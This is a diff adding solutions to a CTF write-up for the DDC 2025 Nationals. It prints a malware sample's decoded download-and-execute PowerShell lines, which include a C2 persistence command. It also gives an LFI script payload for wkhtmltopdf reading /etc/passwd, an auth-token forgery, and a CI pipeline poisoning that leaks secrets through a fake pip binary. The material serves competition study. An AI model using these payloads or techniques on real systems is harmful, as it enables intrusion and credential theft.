@@ -60,16 +60,137 @@ And we get our flag:
 ###### 100pts - 22 solves
 > Vi har fået en invoice fra en eller anden som siger han har lavet en challenge til DDC og skal have nogle penge? Det virker lidt mærkeligt det hele... Kan du tage et kig?
 
+JS in the end of PDF. ``tail Invoice\ 42.pdf.js -n 100``.
+```js
+function dec(str, key) {
+    str = dec2(str)
+    var result = "";
+    for (var i = 0; i < str.length; i++) {
+        var charCode = str.charCodeAt(i);
+        var keyCharCode = key.charCodeAt(i % key.length);
+        result += String.fromCharCode(charCode ^ keyCharCode);
+        
+    }
+    return result;
+}
+
+dec("NAIIFzAuMlg1AyQNDgRMMS1qcgpgKx4cMQAEaDs3PDIFXyccFAIBRhZkHCkvIVIwAxA7GxsWMTg8", "w8T@Y@V7Bpx^w")
+dec("dTVUDD0rbzYAVUlVH3d5FwolNWItAVNfCx1vMBdLJTUmc0UYXwhSNyQfADgqYToRVxZaTD0u", "XVteJYO^t!9&%")
+```
+
+Decoding the last XOR we get:
+```
+-c iwr https://cool-surf-87fc.oli-19f.workers.dev/|iex
+```
+
+By decoding the very last Base64 payload we get:
+```powershell
+$inputLocale = Get-WinUserLanguageList | Select-Object -First 1
+$a = @(58, 99, 55, 100, 114, 101, 97, 126, 116, 114, 55, 58, 116, 55, 53, 84, 45, 75, 64, 126, 121, 115, 120, 96, 100, 75, 68, 110, 100, 99, 114, 122, 36, 37, 75, 116, 122, 115, 57, 114, 111, 114, 53, 55, 58, 118, 55, 53, 56, 116, 55, 103, 120, 96, 114, 101, 100, 127, 114, 123, 123, 55, 58, 116, 55, 126, 96, 101, 55, 127, 99, 99, 103, 100, 45, 56, 56, 116, 37, 100, 114, 101, 97, 114, 101, 57, 127, 124, 121, 56, 69, 82, 69, 83, 114, 37, 70, 96, 115, 37, 34, 113, 115, 80, 112, 109, 79, 36, 94, 39, 78, 122, 94, 111, 115, 81, 46, 120, 90, 80, 96, 109, 79, 109, 81, 39, 79, 109, 81, 109, 79, 36, 94, 39, 115, 80, 112, 109, 116, 123, 46, 125, 115, 79, 94, 111, 117, 36, 65, 109, 113, 70, 42, 42, 53, 55, 58, 121, 55, 53, 84, 127, 101, 120, 122, 114, 55, 66, 103, 115, 118, 99, 114, 101, 53, 55, 58, 122, 55, 118, 115, 115)
+function d($c, $e) {
+    $r = ""
+    for ($i = 0; $i -lt $c.Length; $i++) {
+        $r += [char]($c[$i] -bxor $e)
+    }
+    return $r
+}
+if ($inputLocale.InputMethodTips -match "0409:00000419" -or $inputLocale.InputMethodTips -match "00000419") {
+	$b = 23
+    Invoke-SharPersist (d $a $b)
+}
+```
+
+We can then modify it to the following to easily see the output:
+```powershell
+$a = @(58, 99, 55, 100, 114, 101, 97, 126, 116, 114, 55, 58, 116, 55, 53, 84, 45, 75, 64, 126, 121, 115, 120, 96, 100, 75, 68, 110, 100, 99, 114, 122, 36, 37, 75, 116, 122, 115, 57, 114, 111, 114, 53, 55, 58, 118, 55, 53, 56, 116, 55, 103, 120, 96, 114, 101, 100, 127, 114, 123, 123, 55, 58, 116, 55, 126, 96, 101, 55, 127, 99, 99, 103, 100, 45, 56, 56, 116, 37, 100, 114, 101, 97, 114, 101, 57, 127, 124, 121, 56, 69, 82, 69, 83, 114, 37, 70, 96, 115, 37, 34, 113, 115, 80, 112, 109, 79, 36, 94, 39, 78, 122, 94, 111, 115, 81, 46, 120, 90, 80, 96, 109, 79, 109, 81, 39, 79, 109, 81, 109, 79, 36, 94, 39, 115, 80, 112, 109, 116, 123, 46, 125, 115, 79, 94, 111, 117, 36, 65, 109, 113, 70, 42, 42, 53, 55, 58, 121, 55, 53, 84, 127, 101, 120, 122, 114, 55, 66, 103, 115, 118, 99, 114, 101, 53, 55, 58, 122, 55, 118, 115, 115)
+function d($c, $e) {
+    $r = ""
+    for ($i = 0; $i -lt $c.Length; $i++) {
+        $r += [char]($c[$i] -bxor $e)
+    }
+    return $r
+}
+$b = 23
+Write-Output (d $a $b)
+```
+
+And we get:
+```powershell
+-t service -c "C:\Windows\System32\cmd.exe" -a "/c powershell -c iwr https://c2server.hkn/RERDe2Qwd25fdGgzX3I0YmIxdF9oMGwzXzF0XzFzX3I0dGgzcl9jdXIxb3VzfQ==" -n "Chrome Updater" -m add
+```
+And we get our flag in base64:
+
+``DDC{d0wn_th3_r4bb1t_h0l3_1t_1s_r4th3r_cur1ous}``
+
+
 ### Bøf-baserede værdipapirer og emails
 ###### 353pts - 11 solves
 > I en yderst vigtig e-mail korrespondance diskuterer JD Vance og Donald Trump forretningsidéer i topklasse, store hemmeligheder og absolut ikke mistænkelige aftaler. Dog har de, enten på grund af manglende cybersikkerhedsprincipper eller en lidt for afslappet tilgang til dem, efterladt et flag i en af deres e-mails.
 > 
 > Uheldigt for dem (men heldigt for vores Nationals-deltagere) blev en kopi af denne udveksling opsnappet via en ikke-offentliggjort XKEYSCORE-node. En tidligere NSA-medarbejder, der netop var blevet fyret af Elon Musks DOGE-projekt, har lækket et disk-image fra denne XKEYSCORE-node og han så bestemt ikke tilfreds ud.
 
+
+
 ## Cryptography
 ### Random AES
 ###### 100pts - 37 solves
 > Jeg vil helst undgå noget fancy, der kan gå galt, så jeg holder mig til CTR-tilstand og et tilfældigt bibliotek til keygen. Hvor mange fejl kan man egentlig lave på bare 10 linjer Python?
+
+``main.py``
+```py
+from Crypto.Cipher import AES
+import random
+
+
+with open("flag.txt", "rb") as f:
+    flag = f.read()
+
+# Sample a random 128 bit key by selecting an integer between 0 and 2^128, then converting to bytes
+def genkey():
+    key_int = random.randrange(0,2^128)
+    key_bytes = key_int.to_bytes(16,'little')
+    return key_bytes
+
+# Encrypt with AES CTR mode
+def encrypt_flag(flag, key):
+    aes = AES.new(key, AES.MODE_CTR)
+    ct = aes.encrypt(flag)
+    return aes.nonce, ct
+
+key = genkey()
+nonce, ct = encrypt_flag(flag, key)
+
+with open("output.txt", "w") as f:
+    f.write(f'iv = {nonce.hex()}\n')
+    f.write(f'ct = {ct.hex()}\n')
+```
+
+``output.txt``
+```
+iv = 7f3a8b13e6168fcf
+ct = 98f3824b84bd2fbea359de2af97155d80c6c26acb6a7d4b3452f94cd84c0f561bd5407bb7f7aa72f01b245
+```
+
+``solve.py``
+```py
+from Crypto.Cipher import AES
+
+iv = bytes.fromhex("7f3a8b13e6168fcf")
+ct = bytes.fromhex("98f3824b84bd2fbea359de2af97155d80c6c26acb6a7d4b3452f94cd84c0f561bd5407bb7f7aa72f01b245")
+
+# Bruteforce the key
+for key_int in range(130):  # Key space is 0 to 129
+    key = key_int.to_bytes(16, 'little')
+    try:
+        aes = AES.new(key, AES.MODE_CTR, nonce=iv)
+        flag = aes.decrypt(ct)
+        if b'DDC{' in flag:
+            print(f"Key: {key.hex()}, Flag: {flag}")
+    except ValueError:
+        continue
+```
+
+Flag: ``DDC{Oh_oops_writing_too_much_sage_recently}``
 
 ### Block Party
 ###### 100pts - 24 solves
@@ -77,6 +198,48 @@ And we get our flag:
 > Den krypterede ordre er blevet sendt via deres brugerdefinerede krypteringssystem, der kombinerer mange forskellige AES algoritmer.
 > Kan du intercept beskeden og narre dem til at angribe ved skumringstid i stedet?
 > Kan du hjælpe os?
+
+When connecting:
+```
+Original Data (x): b'!Attack at dawn tomorrow!'
+Ciphertext: f8687eeeb5f17c5d9326891f360f5cf166c8a468b9b9b0f6407848b18d5bf01603c3828822efc631708f40aebbc2554f19d2a8db861c81e8eecdfd7f35e3032f
+Give me the modified ciphertext, quick!
+```
+
+Solve script:
+```
+# Original ciphertext in hex (you'll need to get this from the program's output)
+original_ciphertext_hex = "f8687eeeb5f17c5d9326891f360f5cf166c8a468b9b9b0f6407848b18d5bf01603c3828822efc631708f40aebbc2554f19d2a8db861c81e8eecdfd7f35e3032f"
+
+# Convert to bytes
+original_ciphertext = bytes.fromhex(original_ciphertext_hex)
+iv = original_ciphertext[:16]
+cbc_encrypted = original_ciphertext[16:]
+
+# Positions to modify in the CTR ciphertext (positions of "dawn")
+positions = [12, 13, 14]
+xor_values = [0x14, 0x04, 0x05]
+
+# Modify the IV to affect the CTR ciphertext after CBC decryption
+modified_iv = bytearray(iv)
+for pos, xor_val in zip(positions, xor_values):
+    modified_iv[pos] ^= xor_val
+
+# Create the modified ciphertext
+modified_ciphertext = bytes(modified_iv) + cbc_encrypted
+
+# Output the modified ciphertext in hex
+print(modified_ciphertext.hex())
+```
+
+Modified ciphertext:
+```
+f8687eeeb5f17c5d9326891f220b59f166c8a468b9b9b0f6407848b18d5bf01603c3828822efc631708f40aebbc2554f19d2a8db861c81e8eecdfd7f35e3032f
+```
+
+Send the result to server and we get our flag:
+
+``DDC{m0d35_0f_0p3r4t10n_gall0r3}``
 
 ## Web Exploitation
 
@@ -340,14 +503,127 @@ And this gets us the flag: ``DDC{c0nfu53d_4nd_vuln3r4bl3}``
 > Der må være et hul i det her system. Måske kan du “låne” nabo Bentes mail og rippe hende for gæsteparkeringer...
 > Der må være et eller andet sted på siden, hvor vi kan finde en genvej – måske en URL, som de fleste ikke lige tænker over at tjekke? Prøv at kigge alle de steder, der kunne give mening.
 > Skynd dig… bilen er lige om hjørnet.
+TODO WRITE PROPERLY
+
+After logging in with a user that we have registered:
+![EvilPlot Parking Group homepage](/src/assets/DDC25National/parkingHome.png)
+
+<http://evilplot.hkn/create-parking?user=asd@asd.asd&pId=7&auth=b741531720738198c9aecea0805d4af917cb88741743503c3c25eaab10ace2d3>
+
+From source we can find <http://evilplot.hkn/static/utils.js>
+
+```js
+const CONFIG = {
+  maxRetries: 5,
+  enableLogs: false,
+  debugMode: false,
+  theme: "dark",
+  SECRET: "th1sIsN0tTh3S3cretUreL00k1ngF0r",
+  fallbackPlotId: 99,
+  hashVersion: "v2.1-beta",
+  useLegacyHash: true,
+};
+
+async function sha256(message) {
+  const msgBuffer = new TextEncoder().encode(message);
+  const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+  return hashHex;
+}
+
+async function generateAuthHash(email, pId) {
+  // This hash combines the users email, plot id and secret to create a hash
+  return await sha256(email + pId + CONFIG.SECRET);
+}
+```
+
+So we just need to find the parking ID and email of any other user and we can authenticate as them.
+
+``/robots.txt`` lead to ``/apidocs``. ``/apidocs`` shows ``/api/debug/user`` where if we input the ID ``1`` we get info on the user ``Bente``:
+```json
+{
+  "email": "bente@mail.dk",
+  "plot_id": 6
+}
+```
+
+Now we need the SHA256 hash of the following
+```
+bente@mail.dk6th1sIsN0tTh3S3cretUreL00k1ngF0r
+```
+
+Which is:
+```
+b7e51bbb14c0b38ae395026a11e5cc515574c6363ff59a29bd6acc051a413e6e
+```
+
+We can then modify the URL to login as Bente:
+<http://evilplot.hkn/create-parking?user=bente@mail.dk&pId=6&auth=b7e51bbb14c0b38ae395026a11e5cc515574c6363ff59a29bd6acc051a413e6e>
+
+![EvilPlot Parking Group after logging in as Bente](/src/assets/DDC25National/parkingBente.png)
+
+By then clicking the create parking button, we get the flag in a toast message:
+
+``DDC{D4MN_P4rK1nG_C0Mp4n13S_4_3v3R}``
 
 ### The Legend
 ###### 162pts - 16 solves
 > Jeg har lavet en mega fed legende generator, gå da lige ind og check den ud og få din helt egen custom legende!!.
+TODO WRITE PROPERLY
+
+![Homepage of The Legend](/src/assets/DDC25National/legendHome.png)
+
+By inputting anything and then running exiftool on the PDF we get: ``Creator: wkhtmltopdf 0.12.6``.
+
+By researching this version number we quickly learn that it's vulnerable to SSRF and LFI.<https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536> In this case we can use the LFI to read ``/etc/passwd``:
+```html
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+```
+
+By inputting this in the dream job section we see that a user named ``mrbeef`` exists. We can then try to read the flag from their home directory with:
+```html
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///home/mrbeef/flag.txt");
+x.send();
+</script>
+```
+
+And we get our flag:
+
+``DDC{w4x3d_4nd_w1ck3d_pdF_m4st3ry}``
 
 ### Hestenettet
 ###### 847pts - 4 solves
 > Heyyy - har lavet en ny heste blog 🎉 og tror ikke helt på at nogen kan hacke den. Modsat andre internet fora, finder du ingen source-code leaks her!! Hvis du finder mit password gir jeg et flag (DDC{password}), men har ingen ide om hvordan du nogensinde skulle få det 😆
+TODO WRITE PROPERLY
+
+
+Upon loading the page we can see a bunch of calls to different dotnet DLLs in the network traffic. The interesting ones are:
+<http://hestenettet.hkn/_framework/hesteNETtet.Shared.dll> and http://hestenettet.hkn/_framework/hesteNETtet.Client.dll
+
+By going to the third forum post we can learn that the admin uses a pets name and their birthday followed by a special character for their password. By going to the second post we can learn that their pets name is ``Prusenussen``.
+
+By decompiling the source we get the JWT key, pepper and other juicy info. We can use this to forge a JWT token as the admin.
+By doing that and authenticating as the admin we can use the API endpoint on ``/api/authentication/profile`` to get the password hash.
+
+We can then create a custom wordlist to bruteforce this.
+
+And we get the password which is the flag.
+
 
 ## Boot2Root
 ### Sudo But Cooler
@@ -651,4 +927,100 @@ Now we just run ``bash -p`` and we have a root shell and we can get our flag!
 > Vi har oprettet en ny bruger til dig:<br>
 > Brugernavn: Alice<br>
 > Adgangskode: password
+TODO: WRITE FULLY
 
+
+Ulduar/drone.yml:
+```yml
+---
+kind: pipeline
+type: docker
+name: default
+
+steps:
+- name: test
+  image: registry.devops.hkn/playwright:ulduar
+  environment:
+    server_url: server-app
+  commands:
+  - pip -r requirements.txt
+  - playwright install
+  - playwright install-deps
+  environment:
+    API_KEY:
+      from_secret: API_KEY
+
+services:
+- name: server-app
+  image: registry.devops.hkn/python:buster
+  commands:
+  - pip install -r requirements.txt
+```
+
+Icecrown/drone.yml:
+```yml
+---
+kind: pipeline
+type: docker
+name: Icecrown-Pipeline
+
+steps:
+- name: docker
+  image: registry.devops.hkn/docker:1
+  commands:
+    - docker login https://registry.devops.hkn -u $USERNAME -p $PASSWORD
+    - docker build -t registry.devops.hkn/playwright:ulduar .
+    - docker push registry.devops.hkn/playwright:ulduar
+  environment:
+    PASSWORD:
+      from_secret: docker_password
+    USERNAME:
+      from_secret: docker_username
+```
+
+Icecrown/Dockerfile:
+```dockerfile
+FROM registry.devops.hkn/ubuntu:20.04
+
+RUN apt update
+RUN apt upgrade -y
+
+# Install Python 3 and pip
+RUN apt install python3 python3-pip -y
+
+# Check Python version
+RUN python3 --version
+
+ENV server-app=server-app
+
+RUN pip install playwright
+
+RUN touch /etc/localtime
+
+RUN echo "Europe/Rome" >> /etc/localtime
+
+RUN playwright install
+
+RUN playwright install-deps
+
+CMD [ "echo", "running tests" ]
+```
+
+This fails the pipeline as it does not have internet access and therefore cannot update. Instead we an do the following:
+
+Overwrite pip:
+```dockerfile
+FROM registry.devops.hkn/ubuntu:20.04
+
+RUN echo "env | base64" > /bin/pip
+RUN chmod +x /bin/pip
+```
+
+Go to drone > New build on Icecrown > Pushes the new image > Wait for Ulduar to pull it again (every 2 min)
+
+Go to logs of successfull Ulduar pipeline run > Under test we will find env as a base64 string. Decoding this gets us:
+``API_KEY=DDC{B4CKD00R_1N_TH3_BU1LD}``
+
+And we have our flag!
+
+``DDC{B4CKD00R_1N_TH3_BU1LD}``
